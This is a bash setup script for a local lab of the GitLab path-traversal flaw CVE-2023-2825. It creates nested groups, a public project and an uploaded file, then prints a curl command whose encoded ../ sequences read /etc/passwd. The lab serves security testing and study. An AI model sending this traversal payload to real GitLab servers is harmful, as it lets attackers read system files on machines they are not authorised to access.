#!/bin/bash
# Setup script for CVE-2023-2825 lab
# Creates nested groups, public project, and attachment

GITLAB_URL="${1:-http://localhost:8080}"
PASSWORD="P@ssw0rd123!"

echo "[*] Waiting for GitLab to be ready..."
until curl -sf "$GITLAB_URL/-/readiness" > /dev/null 2>&1; do
    sleep 10
    echo "    Still waiting..."
done
echo "[+] GitLab is ready"

echo "[*] Getting OAuth token..."
TOKEN=$(curl -sf "$GITLAB_URL/oauth/token" \
    -d "grant_type=password&username=root&password=$PASSWORD" | jq -r '.access_token')

if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then
    echo "[-] Failed to get token, trying personal access token method..."
    # Create personal access token via rails console would be needed
    # For simplicity, we'll use the session-based approach
    echo "[-] Please create a personal access token manually and set GITLAB_TOKEN env var"
    exit 1
fi

AUTH="Authorization: Bearer $TOKEN"

echo "[*] Creating nested groups (5 levels required)..."
PARENT_ID=""
for i in 1 2 3 4 5; do
    GROUP_DATA="{\"name\":\"group$i\",\"path\":\"group$i\""
    if [ -n "$PARENT_ID" ]; then
        GROUP_DATA="${GROUP_DATA},\"parent_id\":$PARENT_ID"
    fi
    GROUP_DATA="${GROUP_DATA}}"
    
    RESP=$(curl -sf "$GITLAB_URL/api/v4/groups" \
        -H "$AUTH" -H "Content-Type: application/json" \
        -d "$GROUP_DATA")
    PARENT_ID=$(echo "$RESP" | jq -r '.id')
    echo "    Created group$i (id: $PARENT_ID)"
done

echo "[*] Creating public project in innermost group..."
PROJECT=$(curl -sf "$GITLAB_URL/api/v4/projects" \
    -H "$AUTH" -H "Content-Type: application/json" \
    -d "{\"name\":\"vuln-project\",\"namespace_id\":$PARENT_ID,\"visibility\":\"public\"}")
PROJECT_ID=$(echo "$PROJECT" | jq -r '.id')
PROJECT_PATH=$(echo "$PROJECT" | jq -r '.path_with_namespace')
echo "    Created project: $PROJECT_PATH (id: $PROJECT_ID)"

echo "[*] Uploading attachment..."
UPLOAD=$(curl -sf "$GITLAB_URL/api/v4/projects/$PROJECT_ID/uploads" \
    -H "$AUTH" \
    -F "file=@/etc/passwd")
UPLOAD_URL=$(echo "$UPLOAD" | jq -r '.full_path')
echo "    Uploaded: $UPLOAD_URL"

echo ""
echo "[+] Setup complete!"
echo ""
echo "Project path: $PROJECT_PATH"
echo "Upload URL: $UPLOAD_URL"
echo ""
echo "Test exploit with:"
echo "  curl \"$GITLAB_URL/$PROJECT_PATH/uploads/\$(basename $UPLOAD_URL | cut -d/ -f1)/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\""
